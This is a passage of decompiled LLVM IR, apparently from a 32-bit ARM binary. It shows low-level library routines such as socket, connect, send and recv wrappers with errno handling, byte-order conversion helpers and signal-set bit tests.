  %v5_12368 = phi i32 [ %v1_1235c, %dec_label_pc_1234c ], [ 0, %bb ]
  ret i32 %v5_12368

; uselistorder directives
  uselistorder i32 %v0_12358, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_1236c() local_unnamed_addr {
dec_label_pc_1236c:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1236c = load i32, i32* @r4, align 4
  %v6_1236c = load i32, i32* @r5, align 4
  %v2_12370 = ptrtoint i32* %stack_var_-56 to i32
  %v0_12374 = load i32, i32* @r1, align 4
  store i32 %v0_12374, i32* %r6.global-to-local, align 4
  %v0_12380 = load i32, i32* @r0, align 4
  %v3_12380 = call i32 @function_1077c(i32 %v0_12380, i32 21505, i32 %v2_12370)
  store i32 %v3_12380, i32* %r7.global-to-local, align 4
  %v2_12384 = icmp eq i32 %v3_12380, 0
  %v2_1238c = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_1238c, i32* @r1, align 4
  %v0_12394 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_12384, label %dec_label_pc_1239c, label %dec_label_pc_123c8

dec_label_pc_1239c:                               ; preds = %dec_label_pc_1236c
  %v1_12394 = add i32 %v0_12394, 17
  %v4_123a4 = zext i8 %tmp to i32
  store i32 %v4_123a4, i32* @r5, align 4
  %v2_123a8 = load i32, i32* %stack_var_-56, align 4
  %v1_123ac = inttoptr i32 %v0_12394 to i32*
  store i32 %v2_123a8, i32* %v1_123ac, align 4
  %v3_123ac = add i32 %v0_12394, 4
  %v4_123ac = inttoptr i32 %v3_123ac to i32*
  %v5_123ac = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_123ac, i32* %v4_123ac, align 4
  %v6_123ac = add i32 %v0_12394, 8
  %v7_123ac = inttoptr i32 %v6_123ac to i32*
  %v8_123ac = load i32, i32* @lr, align 4
  store i32 %v8_123ac, i32* %v7_123ac, align 4
  %v0_123b0 = load i32, i32* @r4, align 4
  %v1_123b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_123b0 = add i32 %v1_123b0, 12
  %v3_123b0 = inttoptr i32 %v2_123b0 to i32*
  store i32 %v0_123b0, i32* %v3_123b0, align 4
  %v0_123b4 = load i32, i32* @r5, align 4
  %v1_123b4 = trunc i32 %v0_123b4 to i8
  %v2_123b4 = load i32, i32* %r6.global-to-local, align 4
  %v3_123b4 = add i32 %v2_123b4, 16
  %v4_123b4 = inttoptr i32 %v3_123b4 to i8*
  store i8 %v1_123b4, i8* %v4_123b4, align 1
  %v4_123b8 = call i32 @function_1543c(i32 %v1_12394, i32 %v2_1238c, i32 19, i32 %v2_123a8)
  %v0_123bc = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_123c4 = inttoptr i32 %v4_123b8 to i8*
  %v3_123c4 = call i32 @function_11d70(i8* %v2_123c4, i32 %v0_123bc)
  br label %dec_label_pc_123c8

dec_label_pc_123c8:                               ; preds = %dec_label_pc_1236c, %dec_label_pc_1239c
  %v0_123c8 = phi i32 [ %v3_12380, %dec_label_pc_1236c ], [ %v0_123bc, %dec_label_pc_1239c ]
  store i32 %v3_1236c, i32* @r4, align 4
  store i32 %v6_1236c, i32* @r5, align 4
  ret i32 %v0_123c8

; uselistorder directives
  uselistorder i32 %v0_12394, { 2, 1, 0, 3 }
  uselistorder i32 19, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_123c8, { 1, 0 }
}

define i32 @function_123d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_123d8:
  %v2_123f4 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_123f4
}

define i32 @function_123fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_123fc:
  %tmp = mul i32 %arg1, 256
  %v1_12404 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_12408 = urem i32 %tmp1, 256
  %v5_12408 = or i32 %v4_12408, %v1_12404
  ret i32 %v5_12408

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_12410(i32 %arg1) local_unnamed_addr {
dec_label_pc_12410:
  %v2_1242c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_1242c
}

define i32 @function_12434(i32 %arg1) local_unnamed_addr {
dec_label_pc_12434:
  %tmp = mul i32 %arg1, 256
  %v1_1243c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_12440 = urem i32 %tmp1, 256
  %v5_12440 = or i32 %v4_12440, %v1_1243c
  ret i32 %v5_12440

; uselistorder directives
  uselistorder i32 65280, { 3, 4, 2, 0, 1, 5 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_12448() local_unnamed_addr {
dec_label_pc_12448:
  %ip.global-to-local = alloca i32, align 4
  %v3_12448 = load i32, i32* @r4, align 4
  %v6_12448 = load i32, i32* @r5, align 4
  %v9_12448 = load i32, i32* @r6, align 4
  %v0_1244c = load i32, i32* @r0, align 4
  %v2_1246c = call i32 @llvm.bswap.i32(i32 %v0_1244c)
  %v0_12470 = load i32, i32* @r1, align 4
  %v1_12470 = add i32 %v0_12470, 15
  store i32 %v1_12470, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1249c

dec_label_pc_1247c:                               ; preds = %dec_label_pc_1249c
  %v1_124a0 = urem i32 %v0_124b0, 256
  store i32 0, i32* %ip.global-to-local, align 4
  %v5_12484 = inttoptr i32 %v0_124bc to i8*
  %v6_12484 = call i32 @function_1456c(i8* %v5_12484, i32 %v1_124a0, i32 0, i32 -10, i32 0)
  %v0_12488 = load i32, i32* @r6, align 4
  %v2_12488 = icmp eq i32 %v0_12488, 0
  %v1_1248c = add i32 %v6_12484, -1
  store i32 %v1_1248c, i32* %ip.global-to-local, align 4
  br i1 %v2_12488, label %dec_label_pc_1249c.backedge, label %bb

dec_label_pc_1249c.backedge:                      ; preds = %bb, %dec_label_pc_1247c
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_1248c, %dec_label_pc_1247c ]
  %v0_1249c.pre = load i32, i32* @r5, align 4
  %v0_124a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1249c

bb:                                               ; preds = %dec_label_pc_1247c
  %v4_12494 = inttoptr i32 %v0_12488 to i8*
  store i8 46, i8* %v4_12494, align 1
  %storemerge.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1249c.backedge

dec_label_pc_1249c:                               ; preds = %dec_label_pc_1249c.backedge, %dec_label_pc_12448
  %v0_124bc = phi i32 [ %v1_12470, %dec_label_pc_12448 ], [ %storemerge.pre, %dec_label_pc_1249c.backedge ]
  %storemerge = phi i32 [ 0, %dec_label_pc_12448 ], [ %storemerge.pre, %dec_label_pc_1249c.backedge ]
  %v0_124b0 = phi i32 [ %v2_1246c, %dec_label_pc_12448 ], [ %v0_124a0.pre, %dec_label_pc_1249c.backedge ]
  %v0_124b4 = phi i32 [ 0, %dec_label_pc_12448 ], [ %v0_1249c.pre, %dec_label_pc_1249c.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_1249c = icmp eq i32 %v0_124b4, 3
  store i1 %v7_1249c, i1* @cpsr_z, align 1
  %v3_124b0 = udiv i32 %v0_124b0, 256
  store i32 %v3_124b0, i32* @r4, align 4
  %v1_124b4 = add i32 %v0_124b4, 1
  store i32 %v1_124b4, i32* @r5, align 4
  %v7_124b8 = icmp sgt i32 %v0_124b4, 3
  br i1 %v7_124b8, label %dec_label_pc_124bc, label %dec_label_pc_1247c

dec_label_pc_124bc:                               ; preds = %dec_label_pc_1249c
  %v1_124bc = add i32 %v0_124bc, 1
  store i32 %v3_12448, i32* @r4, align 4
  store i32 %v6_12448, i32* @r5, align 4
  store i32 %v9_12448, i32* @r6, align 4
  ret i32 %v1_124bc

; uselistorder directives
  uselistorder i32 %v0_124b4, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @function_1456c, { 2, 0, 1 }
  uselistorder i32 -10, { 1, 2, 0 }
}

define i32 @function_124c8(i32* %arg1) local_unnamed_addr {
dec_label_pc_124c8:
  store i32 ptrtoint (i32* @global_var_265f8.294 to i32), i32* @r1, align 4
  %v0_124cc = call i32 @function_12448()
  %v0_124d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_124d0, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_124c8
  %v1_124d0 = load i32, i32* @r6, align 4
  store i32 %v1_124d0, i32* %arg1, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_124c8, %bb
  ret i32 %v0_124cc

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_124d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_124d4:
  %stack_var_-8 = alloca i32, align 4
  %v2_124d8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_124d8, i32* @r1, align 4
  %v0_124e0 = call i32 @function_155f4()
  %v2_124e4 = icmp eq i32 %v0_124e0, 0
  br i1 %v2_124e4, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_124d4
  %v3_124ec = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_124d4, %bb
  %v5_124f4 = phi i32 [ -1, %dec_label_pc_124d4 ], [ %v3_124ec, %bb ]
  ret i32 %v5_124f4

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_124f8(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_124f8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_124f8 = load i32, i32* @r4, align 4
  store i32 %v3_124f8, i32* %stack_var_-8, align 4
  %v5_124fc = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_124fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_124fc, -4095
  br i1 %tmp, label %dec_label_pc_1251c, label %dec_label_pc_1250c

dec_label_pc_1250c:                               ; preds = %dec_label_pc_124f8
  %v0_1250c = call i32 @function_10a18()
  %v0_12510 = load i32, i32* %r4.global-to-local, align 4
  %v1_12510 = sub i32 0, %v0_12510
  %v2_12514 = inttoptr i32 %v0_1250c to i32*
  store i32 %v1_12510, i32* %v2_12514, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1251c

dec_label_pc_1251c:                               ; preds = %dec_label_pc_124f8, %dec_label_pc_1250c
  %v0_1251c = phi i32 [ %v5_124fc, %dec_label_pc_124f8 ], [ -1, %dec_label_pc_1250c ]
  %v2_12520 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12520, i32* @r4, align 4
  ret i32 %v0_1251c

; uselistorder directives
  uselistorder i32 %v5_124fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1251c, { 1, 0 }
}

define i32 @function_12524(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12524:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12524 = load i32, i32* @r4, align 4
  store i32 %v3_12524, i32* %stack_var_-8, align 4
  %v5_12528 = inttoptr i32 %arg3 to i32*
  %v6_12528 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_12528)
  store i32 %v6_12528, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_12528, -4095
  br i1 %tmp, label %dec_label_pc_12548, label %dec_label_pc_12538

dec_label_pc_12538:                               ; preds = %dec_label_pc_12524
  %v0_12538 = call i32 @function_10a18()
  %v0_1253c = load i32, i32* %r4.global-to-local, align 4
  %v1_1253c = sub i32 0, %v0_1253c
  %v2_12540 = inttoptr i32 %v0_12538 to i32*
  store i32 %v1_1253c, i32* %v2_12540, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12548

dec_label_pc_12548:                               ; preds = %dec_label_pc_12524, %dec_label_pc_12538
  %v0_12548 = phi i32 [ %v6_12528, %dec_label_pc_12524 ], [ -1, %dec_label_pc_12538 ]
  %v2_1254c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1254c, i32* @r4, align 4
  ret i32 %v0_12548

; uselistorder directives
  uselistorder i32 %v6_12528, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12548, { 1, 0 }
}

define i32 @function_12550(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12550:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12550 = load i32, i32* @r4, align 4
  store i32 %v3_12550, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_12558 = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32* null)
  store i32 %v5_12558, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12558, -4095
  br i1 %tmp, label %dec_label_pc_12578, label %dec_label_pc_12568

dec_label_pc_12568:                               ; preds = %dec_label_pc_12550
  %v0_12568 = call i32 @function_10a18()
  %v0_1256c = load i32, i32* %r4.global-to-local, align 4
  %v1_1256c = sub i32 0, %v0_1256c
  %v2_12570 = inttoptr i32 %v0_12568 to i32*
  store i32 %v1_1256c, i32* %v2_12570, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12578

dec_label_pc_12578:                               ; preds = %dec_label_pc_12550, %dec_label_pc_12568
  %v0_12578 = phi i32 [ %v5_12558, %dec_label_pc_12550 ], [ -1, %dec_label_pc_12568 ]
  %v2_1257c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1257c, i32* @r4, align 4
  ret i32 %v0_12578

; uselistorder directives
  uselistorder i32 %v5_12558, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12578, { 1, 0 }
}

define i32 @function_12580(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12580:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12580 = load i32, i32* @r4, align 4
  store i32 %v3_12580, i32* %stack_var_-8, align 4
  %v5_12584 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12584, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12584, -4095
  br i1 %tmp, label %dec_label_pc_125a4, label %dec_label_pc_12594

dec_label_pc_12594:                               ; preds = %dec_label_pc_12580
  %v0_12594 = call i32 @function_10a18()
  %v0_12598 = load i32, i32* %r4.global-to-local, align 4
  %v1_12598 = sub i32 0, %v0_12598
  %v2_1259c = inttoptr i32 %v0_12594 to i32*
  store i32 %v1_12598, i32* %v2_1259c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_125a4

dec_label_pc_125a4:                               ; preds = %dec_label_pc_12580, %dec_label_pc_12594
  %v0_125a4 = phi i32 [ %v5_12584, %dec_label_pc_12580 ], [ -1, %dec_label_pc_12594 ]
  %v2_125a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_125a8, i32* @r4, align 4
  ret i32 %v0_125a4

; uselistorder directives
  uselistorder i32 %v5_12584, { 1, 0, 2 }
  uselistorder label %dec_label_pc_125a4, { 1, 0 }
}

define i32 @function_125ac(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_125ac:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_125ac = load i32, i32* @r4, align 4
  store i32 %v3_125ac, i32* %stack_var_-8, align 4
  %v5_125b0 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_125b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_125b0, -4095
  br i1 %tmp, label %dec_label_pc_125d0, label %dec_label_pc_125c0

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125ac
  %v0_125c0 = call i32 @function_10a18()
  %v0_125c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_125c4 = sub i32 0, %v0_125c4
  %v2_125c8 = inttoptr i32 %v0_125c0 to i32*
  store i32 %v1_125c4, i32* %v2_125c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_125d0

dec_label_pc_125d0:                               ; preds = %dec_label_pc_125ac, %dec_label_pc_125c0
  %v0_125d0 = phi i32 [ %v5_125b0, %dec_label_pc_125ac ], [ -1, %dec_label_pc_125c0 ]
  %v2_125d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_125d4, i32* @r4, align 4
  ret i32 %v0_125d0

; uselistorder directives
  uselistorder i32 %v5_125b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_125d0, { 1, 0 }
}

define i32 @function_125d8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_125d8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_125d8 = load i32, i32* @r4, align 4
  store i32 %v3_125d8, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_125e4 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_125e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_125e4, -4095
  br i1 %tmp, label %dec_label_pc_12604, label %dec_label_pc_125f4

dec_label_pc_125f4:                               ; preds = %dec_label_pc_125d8
  %v0_125f4 = call i32 @function_10a18()
  %v0_125f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_125f8 = sub i32 0, %v0_125f8
  %v2_125fc = inttoptr i32 %v0_125f4 to i32*
  store i32 %v1_125f8, i32* %v2_125fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12604

dec_label_pc_12604:                               ; preds = %dec_label_pc_125d8, %dec_label_pc_125f4
  %v0_12604 = phi i32 [ %v5_125e4, %dec_label_pc_125d8 ], [ -1, %dec_label_pc_125f4 ]
  %v2_12608 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12608, i32* @r4, align 4
  ret i32 %v0_12604

; uselistorder directives
  uselistorder i32 %v5_125e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12604, { 1, 0 }
}

define i32 @function_1260c(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1260c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1260c = load i32, i32* @r4, align 4
  store i32 %v3_1260c, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_12614 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_12614, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12614, -4095
  br i1 %tmp, label %dec_label_pc_12634, label %dec_label_pc_12624

dec_label_pc_12624:                               ; preds = %dec_label_pc_1260c
  %v0_12624 = call i32 @function_10a18()
  %v0_12628 = load i32, i32* %r4.global-to-local, align 4
  %v1_12628 = sub i32 0, %v0_12628
  %v2_1262c = inttoptr i32 %v0_12624 to i32*
  store i32 %v1_12628, i32* %v2_1262c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12634

dec_label_pc_12634:                               ; preds = %dec_label_pc_1260c, %dec_label_pc_12624
  %v0_12634 = phi i32 [ %v5_12614, %dec_label_pc_1260c ], [ -1, %dec_label_pc_12624 ]
  %v2_12638 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12638, i32* @r4, align 4
  ret i32 %v0_12634

; uselistorder directives
  uselistorder i32 %v5_12614, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12634, { 1, 0 }
}

define i32 @function_1263c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1263c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1263c = load i32, i32* @r4, align 4
  store i32 %v3_1263c, i32* %stack_var_-8, align 4
  %v3_12640 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_12640, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_12640, -4095
  br i1 %tmp, label %dec_label_pc_12660, label %dec_label_pc_12650

dec_label_pc_12650:                               ; preds = %dec_label_pc_1263c
  %v0_12650 = call i32 @function_10a18()
  %v0_12654 = load i32, i32* %r4.global-to-local, align 4
  %v1_12654 = sub i32 0, %v0_12654
  %v2_12658 = inttoptr i32 %v0_12650 to i32*
  store i32 %v1_12654, i32* %v2_12658, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12660

dec_label_pc_12660:                               ; preds = %dec_label_pc_1263c, %dec_label_pc_12650
  %v0_12660 = phi i32 [ %v3_12640, %dec_label_pc_1263c ], [ -1, %dec_label_pc_12650 ]
  %v2_12664 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12664, i32* @r4, align 4
  ret i32 %v0_12660

; uselistorder directives
  uselistorder i32 %v3_12640, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12660, { 1, 0 }
}

define i32 @function_12668(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12668:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_12684, label %dec_label_pc_12674

dec_label_pc_12674:                               ; preds = %dec_label_pc_12668
  %v8_12678 = icmp sgt i32 %arg1, 64
  br i1 %v8_12678, label %dec_label_pc_12684, label %dec_label_pc_1267c

dec_label_pc_1267c:                               ; preds = %dec_label_pc_12674
  %v0_12680 = call i32 @function_1278c()
  br label %dec_label_pc_12684

dec_label_pc_12684:                               ; preds = %dec_label_pc_12674, %dec_label_pc_12668, %dec_label_pc_1267c
  %v0_12684 = call i32 @function_10a18()
  %v2_1268c = inttoptr i32 %v0_12684 to i32*
  store i32 22, i32* %v2_1268c, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12684, { 2, 0, 1 }
}

define i32 @function_12698(i32 %arg1) local_unnamed_addr {
dec_label_pc_12698:
  store i32 128, i32* @r2, align 4
  %v0_126a4 = load i32, i32* @r0, align 4
  %v2_126a4 = inttoptr i32 %v0_126a4 to i8*
  %v3_126a4 = call i32 @function_11d70(i8* %v2_126a4, i32 0)
  ret i32 0
}

define i32 @function_126b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_126b0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_126b0 = load i32, i32* @r4, align 4
  store i32 %v3_126b0, i32* %stack_var_-12, align 4
  %v6_126b0 = load i32, i32* @r5, align 4
  %v10_126b0 = ptrtoint i32* %stack_var_-12 to i32
  %v7_126b4 = icmp eq i32 %arg2, -1
  %v0_126c0.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_126b4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_126b0
  br label %dec_label_pc_126d8

bb:                                               ; preds = %dec_label_pc_126b0
  %v2_126bc = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_126c0.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_126c0.pre, 1
  br i1 %tmp19, label %dec_label_pc_126d8, label %dec_label_pc_126c8

dec_label_pc_126c8:                               ; preds = %bb
  %v7_126cc = icmp sgt i32 %v0_126c0.pre, 64
  br i1 %v7_126cc, label %dec_label_pc_126d8, label %bb20

bb20:                                             ; preds = %dec_label_pc_126c8
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_126fc24 = add i32 %v10_126b0, 124
  store i32 %v5_126fc24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_126ec

dec_label_pc_126d8:                               ; preds = %.thread, %dec_label_pc_126c8, %bb
  %v0_126d8 = call i32 @function_10a18()
  store i32 %v0_126d8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_126e4 = inttoptr i32 %v0_126d8 to i32*
  store i32 22, i32* %v2_126e4, align 4
  %v0_12758.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12758

dec_label_pc_126ec:                               ; preds = %bb20, %dec_label_pc_126ec
  %v5_126fc25 = phi i32 [ %v5_126fc24, %bb20 ], [ %v5_126fc, %dec_label_pc_126ec ]
  %v2_126f0 = add i32 %v5_126fc25, -136
  %v3_126f0 = inttoptr i32 %v2_126f0 to i32*
  store i32 0, i32* %v3_126f0, align 4
  %v0_126f4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_126f4 = add i32 %v0_126f4.pre, -1
  store i32 %v1_126f4, i32* %r0.global-to-local, align 4
  %v6_126f4 = icmp slt i32 %v1_126f4, 0
  %v4_126fc = mul i32 %v1_126f4, 4
  %v5_126fc = add i32 %v4_126fc, %v10_126b0
  store i32 %v5_126fc, i32* %r2.global-to-local, align 4
  br i1 %v6_126f4, label %dec_label_pc_12704, label %dec_label_pc_126ec

dec_label_pc_12704:                               ; preds = %dec_label_pc_126ec
  %v2_12704 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_12704, i32* @r5, align 4
  %v2_12708 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_12708, i32* @r0, align 4
  %v0_1270c = load i32, i32* @r4, align 4
  store i32 %v0_1270c, i32* @r1, align 4
  %v0_12710 = call i32 @function_1278c()
  store i32 %v0_12710, i32* %r0.global-to-local, align 4
  %v1_12714 = icmp slt i32 %v0_12710, 0
  br i1 %v1_12714, label %dec_label_pc_12754, label %dec_label_pc_1271c

dec_label_pc_1271c:                               ; preds = %dec_label_pc_12704
  %v0_1271c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_26658.296 to i32), i32* %r0.global-to-local, align 4
  %v2_12724 = call i32 @function_12768(i32 ptrtoint (i32* @global_var_26658.296 to i32), i32 %v0_1271c)
  store i32 %v2_126bc, i32* %r2.global-to-local, align 4
  %v0_1273c = load i32, i32* @r4, align 4
  store i32 %v0_1273c, i32* %r0.global-to-local, align 4
  %v4_12744 = call i32 @function_13da0(i32 %v0_1273c, i32* nonnull %stack_var_-152, i32 %v2_126bc)
  store i32 %v4_12744, i32* %r0.global-to-local, align 4
  %v1_12748 = icmp slt i32 %v4_12744, 0
  br i1 %v1_12748, label %dec_label_pc_12754, label %bb23

bb23:                                             ; preds = %dec_label_pc_1271c
  %v5_1274c = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_1274c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12758

dec_label_pc_12754:                               ; preds = %dec_label_pc_1271c, %dec_label_pc_12704
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12758

dec_label_pc_12758:                               ; preds = %bb23, %dec_label_pc_126d8, %dec_label_pc_12754
  %v0_12758 = phi i32 [ %v5_1274c, %bb23 ], [ %v0_12758.pre, %dec_label_pc_126d8 ], [ -1, %dec_label_pc_12754 ]
  store i32 %v0_12758, i32* %r0.global-to-local, align 4
  %v2_12760 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12760, i32* @r4, align 4
  store i32 %v6_126b0, i32* @r5, align 4
  ret i32 %v0_12758

; uselistorder directives
  uselistorder i32 %v0_12758, { 1, 0 }
  uselistorder i32 %v5_126fc, { 1, 0 }
  uselistorder i32 %v1_126f4, { 0, 2, 1 }
  uselistorder i32 %v2_126bc, { 1, 0 }
  uselistorder i32 %v0_126c0.pre, { 1, 0, 2 }
  uselistorder i32 %v10_126b0, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12758, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126ec, { 1, 0 }
  uselistorder label %dec_label_pc_126d8, { 1, 2, 0 }
}

define i32 @function_12768(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12768:
  %v1_12768 = add i32 %arg2, -1
  %v3_1276c = udiv i32 %v1_12768, 32
  %v4_12770 = mul nuw nsw i32 %v3_1276c, 4
  %v5_12770 = add i32 %v4_12770, %arg1
  %v6_12770 = inttoptr i32 %v5_12770 to i32*
  %v7_12770 = load i32, i32* %v6_12770, align 4
  %v1_12774 = urem i32 %v1_12768, 32
  %v7_1277c = shl i32 1, %v1_12774
  %v8_1277c = and i32 %v7_12770, %v7_1277c
  %v10_1277c = icmp ne i32 %v8_1277c, 0
  %. = zext i1 %v10_1277c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_12768, { 1, 0 }
}

define i32 @function_1278c() local_unnamed_addr {
